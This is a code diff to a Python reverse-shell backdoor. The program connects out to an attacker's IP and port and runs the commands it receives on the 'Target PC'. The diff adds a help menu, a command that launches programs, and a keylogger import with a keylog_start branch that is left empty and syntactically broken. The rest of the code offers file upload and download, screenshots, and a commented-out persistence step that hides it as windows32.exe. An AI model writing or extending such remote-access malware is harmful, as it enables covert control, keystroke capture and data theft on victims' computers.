@@ -9,7 +9,9 @@ import shutil
 import sys
 import time
 import requests
-from mss import mss 
+import threading
+import keylogger
+from mss import mss
 
 
 def reliable_send(data):
@@ -40,6 +42,14 @@ def shell():
         command = reliable_recv()
         if command == 'q':
             break
+        elif command == "help":
+            help_options = '''                    download [path] --> Download A file From Target PC
+                    upload [path]   --> Upload A File to Target PC
+                    get [url]       --> Download A File To Target PC from any link
+                    start [path]    --> Run A Program on Target PC
+                    screenshot      --> Take A Screenshot of Target Screen
+                    q               --> Exit The Reverse Shell '''
+            reliable_send(help_options)
         elif command[:2] == "cd" and len(command) > 1:
             try:
                 os.chdir(command[3:])
@@ -66,6 +76,14 @@ def shell():
                 os.remove("monitor-1.png")
             except:
                 reliable_send("[!!]Failed To Take Screenshot")
+        elif command[:5] == "start":
+            try:
+                subprocess.Popen(command[6:], shell=True)
+                reliable_send("[+] Program Started")
+            except:
+                reliable_send("[!!] Failed To Start")
+        elif command == "keylog_start":
+
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
@@ -74,7 +92,6 @@ def shell():
 def connection():
     global ip
     global port
-
     while True:
         time.sleep(5)
         try:
@@ -83,8 +100,6 @@ def connection():
         except:
             connection()
 
-ip = sys.argv[1]
-port = int(sys.argv[2])
 
 # location = os.environ["appdata"] = "\\windows32.exe"
 # if not os.path.exists(location):
@@ -93,6 +108,10 @@ port = int(sys.argv[2])
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+ip = sys.argv[1]
+port = int(sys.argv[2])
 
 connection()
 sock.close()
